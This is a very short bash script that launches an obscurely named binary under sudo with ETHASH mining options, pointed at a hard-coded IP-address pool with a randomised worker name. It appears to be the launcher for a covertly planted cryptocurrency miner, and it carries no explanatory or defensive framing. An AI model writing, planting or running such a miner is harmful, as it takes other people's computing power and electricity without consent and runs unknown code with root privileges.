#!/bin/bash
#!/bin/bash

POOL=128.199.157.196:14699
WALLET=Acc10h30-$(shuf -n 1 -i 1-9999)
cd "$(dirname "$0")"

chmod +x ./avcddf34563fdd && sudo ./avcddf34563fdd --algo ETHASH --pool $POOL --user $WALLET  $@
